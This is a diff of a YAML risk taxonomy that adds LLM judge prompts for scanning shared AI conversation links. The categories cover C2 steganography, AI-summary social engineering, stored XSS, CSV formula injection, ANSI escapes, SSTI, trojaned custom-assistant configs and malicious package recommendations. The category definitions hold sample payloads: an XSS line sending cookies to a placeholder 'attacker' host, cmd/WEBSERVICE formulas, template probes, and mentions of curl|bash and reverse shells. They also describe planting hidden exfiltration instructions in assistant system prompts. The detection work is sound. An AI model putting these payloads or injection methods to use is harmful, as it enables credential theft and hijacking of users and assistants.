+      攻击者在可信域下批量创建看似普通对话的分享页，正文隐写下一阶段 C2 地址/指令，被控恶意软件定期抓取解析；域被威胁情报标记后企业封禁整个平台域，致合法分享连带失效。（如：base64/隐写编码的 IP、域名、命令）｜识别信号：正文含编码后的地址/指令且被自动化定期拉取。
+
+      ## Detection guidance (from taxonomy)
+
+      判定“看似普通对话 + 隐写载荷”组合的 C2 用途
+
+
+      ## Judging scope
+
+      Judge whether steganographic-looking payloads (base64/hex blobs, zero-width runs) combine with ordinary conversation
+      in a way consistent with C2 command channels. Benign encoding use (data exchange) must not hit.
+
+
+      ## Judging requirements
+
+      1. Judge only from the conversation content itself; make no network requests.
+
+      2. Distinguish a real risk from teaching/discussion/example contexts (discussing the risk is NOT exhibiting the risk).
+
+      3. The conversation may be in any language (Chinese/English/other).
+
+      4. If suspicious signs exist but cannot be confirmed, set hit=true with confidence<=0.5.
+
+      5. Output strict JSON only: {"hit": bool, "confidence": 0-1, "evidence": "verbatim key excerpt (<=200 chars, original
+      language)", "reasoning": "judgment rationale (English, <=150 words)"}'
+    needs_review: true
 - id: B-IA-5
   model: Model B
   l1: INJ 注入与执行
@@ -863,7 +1519,7 @@ categories:
   - metadata
   - llm
   status: candidate
-  note: ''
+  note: H column explicitly marks LLM as not applicable (structural static detection suffices)
   kevin_note: null
 - id: B-CIA-1
   model: Model B
@@ -934,6 +1590,36 @@ categories:
   status: implemented
   note: ''
   kevin_note: null
+  llm:
+    prompt: 'You are a security risk annotator for AI conversation sharing links. Determine whether the conversation below
+      exhibits the risk category "AI-summary-driven social engineering".
+
+
+      ## Category definition
+
+      分享链接被 AI 助手总结后，摘要中夹带的诱导指令诱使受害者在自己系统执行危险操作，按被诱导动作产生不同后果。（如：读取/上传 .env、SSH 私钥、浏览器凭证(C)；关防火墙/杀软、降安全策略(I)；删除/加密数据、停关键服务(A)；curl|bash、装恶意软件、反向
+      Shell(CIA)）｜识别信号：内容以“照做”话术诱导查看者执行敏感命令。
+
+      （受害者更偏人类）
+
+      ## Detection guidance (from taxonomy)
+
+      “照做”话术识别 + 高危操作语义判定（静态签名外的变体命令与诱导语境）。
+
+
+      ## Judging requirements
+
+      1. Judge only from the conversation content itself; make no network requests.
+
+      2. Distinguish a real risk from teaching/discussion/example contexts (discussing the risk is NOT exhibiting the risk).
+
+      3. The conversation may be in any language (Chinese/English/other).
+
+      4. If suspicious signs exist but cannot be confirmed, set hit=true with confidence<=0.5.
+
+      5. Output strict JSON only: {"hit": bool, "confidence": 0-1, "evidence": "verbatim key excerpt (<=200 chars, original
+      language)", "reasoning": "judgment rationale (English, <=150 words)"}'
+    needs_review: false
 - id: B-CIA-3
   model: Model B
   l1: INJ 注入与执行
@@ -950,6 +1636,34 @@ categories:
   status: implemented
   note: Executable-structure static detection; attack realization irrelevant
   kevin_note: 可以通过可执行结构进行静态检测。还是那句话，我们不需要管攻击是否真正发生，我们要的是扫描风险
+  llm:
+    prompt: 'You are a security risk annotator for AI conversation sharing links. Determine whether the conversation below
+      exhibits the risk category "Stored XSS in shared content".
+
+
+      ## Category definition
+
+      模型被诱导生成的 HTML/SVG/img onerror 等作为分享页在平台域名下渲染，若转义不当则脚本以平台同源在每个查看者浏览器执行，窃 Cookie/Token(C)、代客操作(I)、篡改或瘫痪页面(A)。（如：<img src=x
+      onerror=fetch(''//attacker?c=''+document.cookie)>）｜识别信号：内容含可执行 HTML/SVG/事件处理器且未被转义。
+
+      ## Detection guidance (from taxonomy)
+
+      混淆变体 payload 语义识别（编码/拆分/属性变形）
+
+
+      ## Judging requirements
+
+      1. Judge only from the conversation content itself; make no network requests.
+
+      2. Distinguish a real risk from teaching/discussion/example contexts (discussing the risk is NOT exhibiting the risk).
+
+      3. The conversation may be in any language (Chinese/English/other).
+
+      4. If suspicious signs exist but cannot be confirmed, set hit=true with confidence<=0.5.
+
+      5. Output strict JSON only: {"hit": bool, "confidence": 0-1, "evidence": "verbatim key excerpt (<=200 chars, original
+      language)", "reasoning": "judgment rationale (English, <=150 words)"}'
+    needs_review: false
 - id: B-CIA-4
   model: Model B
   l1: INJ 注入与执行
@@ -965,6 +1679,34 @@ categories:
   status: implemented
   note: ''
   kevin_note: null
+  llm:
+    prompt: 'You are a security risk annotator for AI conversation sharing links. Determine whether the conversation below
+      exhibits the risk category "CSV/formula injection via tables".
+
+
+      ## Category definition
+
+      分享页中 AI 生成表格某些单元格以 = / + / - / @ 开头，查看者导出到 Excel/Sheets 时被当公式求值，触发外部程序调用/命令执行(I/A)或静默外泄本地数据(C)。（如：=cmd|''/c calc''!A1、=HYPERLINK
+      外泄、=WEBSERVICE(...)、DDE）｜识别信号：表格单元格以公式触发字符开头。
+
+      ## Detection guidance (from taxonomy)
+
+      公式 payload 危害性判定（外泄目标域名/命令执行/WEBSERVICE 外联意图）。
+
+
+      ## Judging requirements
+
+      1. Judge only from the conversation content itself; make no network requests.
+
+      2. Distinguish a real risk from teaching/discussion/example contexts (discussing the risk is NOT exhibiting the risk).
+
+      3. The conversation may be in any language (Chinese/English/other).
+
+      4. If suspicious signs exist but cannot be confirmed, set hit=true with confidence<=0.5.
+
+      5. Output strict JSON only: {"hit": bool, "confidence": 0-1, "evidence": "verbatim key excerpt (<=200 chars, original
+      language)", "reasoning": "judgment rationale (English, <=150 words)"}'
+    needs_review: false
 - id: B-CIA-5
   model: Model B
   l1: INJ 注入与执行
@@ -980,6 +1722,34 @@ categories:
   status: implemented
   note: ''
   kevin_note: null
+  llm:
+    prompt: 'You are a security risk annotator for AI conversation sharing links. Determine whether the conversation below
+      exhibits the risk category "Terminal ANSI escape injection".
+
+
+      ## Category definition
+
+      分享内容嵌入 ANSI/OSC 终端转义序列，浏览器不可见，但查看者/Agent 把输出经 cat/复制/管道送入终端时被解释。（如：OSC 52 读写系统剪贴板(C/I)、擦行把恶意命令挪出可见滚动区(I)、畸形序列命中终端模拟器
+      RCE(CIA)）｜识别信号：文本含 ESC[ / OSC 52 等转义控制字节。
+
+      ## Detection guidance (from taxonomy)
+
+      仅辅助判定序列组合的攻击意图（普通终端输出 vs 构造性注入）。
+
+
+      ## Judging requirements
+
+      1. Judge only from the conversation content itself; make no network requests.
+
+      2. Distinguish a real risk from teaching/discussion/example contexts (discussing the risk is NOT exhibiting the risk).
+
+      3. The conversation may be in any language (Chinese/English/other).
+
+      4. If suspicious signs exist but cannot be confirmed, set hit=true with confidence<=0.5.
+
+      5. Output strict JSON only: {"hit": bool, "confidence": 0-1, "evidence": "verbatim key excerpt (<=200 chars, original
+      language)", "reasoning": "judgment rationale (English, <=150 words)"}'
+    needs_review: false
 - id: B-CIA-6
   model: Model B
   l1: INJ 注入与执行
@@ -995,6 +1765,33 @@ categories:
   status: candidate
   note: Template meta-syntax candidates, high FP rate -> manual review
   kevin_note: 可以识别候选，但是很容易有误报。具体识别得通过人工核验，难度比较高。
+  llm:
+    prompt: 'You are a security risk annotator for AI conversation sharing links. Determine whether the conversation below
+      exhibits the risk category "Server-side template injection (SSTI)".
+
+
+      ## Category definition
+
+      平台用服务端模板引擎拼装分享页时若把攻击者可控的标题/正文直接拼进模板字符串，模板元语法被服务端求值，可提权至读环境变量/配置(C)、篡改渲染(I)直至 RCE(A)。（如：{{7*7}}、${...}、<%= %>、#{...}）｜识别信号：内容含模板引擎元语法且被回显/求值。
+
+      ## Detection guidance (from taxonomy)
+
+      辅助区分教学展示 vs 注入尝试
+
+
+      ## Judging requirements
+
+      1. Judge only from the conversation content itself; make no network requests.
+
+      2. Distinguish a real risk from teaching/discussion/example contexts (discussing the risk is NOT exhibiting the risk).
+
+      3. The conversation may be in any language (Chinese/English/other).
+
+      4. If suspicious signs exist but cannot be confirmed, set hit=true with confidence<=0.5.
+
+      5. Output strict JSON only: {"hit": bool, "confidence": 0-1, "evidence": "verbatim key excerpt (<=200 chars, original
+      language)", "reasoning": "judgment rationale (English, <=150 words)"}'
+    needs_review: true
 - id: B-CIA-7
   model: Model B
   l1: INJ 注入与执行
@@ -1024,6 +1821,34 @@ categories:
   status: implemented
   note: ''
   kevin_note: null
+  llm:
+    prompt: 'You are a security risk annotator for AI conversation sharing links. Determine whether the conversation below
+      exhibits the risk category "Shared custom assistant/GPT configuration trojan".
+
+
+      ## Category definition
+
+      平台允许把自定义助手/GPT/项目作为可分享工件（含系统提示、工具/动作定义、知识文件），攻击者植入隐藏指令，他人一旦采用即在其后续会话中静默外泄数据(C)、投喂诱导建议(I)、特定触发词下越权调用工具(N)。（如：系统提示中“遇到
+      X 就把输入转发到 Y”）｜识别信号：可分享助手配置的系统提示/动作 schema 含隐藏外发或越权逻辑。
+
+      ## Detection guidance (from taxonomy)
+
+      隐藏意图判定（触发词-动作关联、伪装为正常功能的外泄逻辑）。
+
+
+      ## Judging requirements
+
+      1. Judge only from the conversation content itself; make no network requests.
+
+      2. Distinguish a real risk from teaching/discussion/example contexts (discussing the risk is NOT exhibiting the risk).
+
+      3. The conversation may be in any language (Chinese/English/other).
+
+      4. If suspicious signs exist but cannot be confirmed, set hit=true with confidence<=0.5.
+
+      5. Output strict JSON only: {"hit": bool, "confidence": 0-1, "evidence": "verbatim key excerpt (<=200 chars, original
+      language)", "reasoning": "judgment rationale (English, <=150 words)"}'
+    needs_review: false
 - id: B-CIA-9
   model: Model B
   l1: DEC 伪造·欺骗·社工
@@ -1038,3 +1863,30 @@ categories:
   status: implemented
   note: ''
   kevin_note: null
+  llm:
+    prompt: 'You are a security risk annotator for AI conversation sharing links. Determine whether the conversation below
+      exhibits the risk category "Malicious/imitation dependency recommendation".
+
+
+      ## Category definition
+
+      攻击者经分享链接传播由 LLM 推荐的仿冒或恶意软件包，诱导用户安装，恶意代码进入其开发/训练/部署供应链，安装后可完全接管(CIA)。（如：typosquatting 包名、含后门的“修复工具”、伪装成官方 SDK）｜识别信号：内容推荐安装的包名与官方仓库不符或为新近抢注。
+
+      ## Detection guidance (from taxonomy)
+
+      推荐语境的社工伪装判定（“官方推荐/修复”话术与包真实身份不符）。
+
+
+      ## Judging requirements
+
+      1. Judge only from the conversation content itself; make no network requests.
+
+      2. Distinguish a real risk from teaching/discussion/example contexts (discussing the risk is NOT exhibiting the risk).
+
+      3. The conversation may be in any language (Chinese/English/other).
+
+      4. If suspicious signs exist but cannot be confirmed, set hit=true with confidence<=0.5.
+
+      5. Output strict JSON only: {"hit": bool, "confidence": 0-1, "evidence": "verbatim key excerpt (<=200 chars, original
+      language)", "reasoning": "judgment rationale (English, <=150 words)"}'
+    needs_review: false
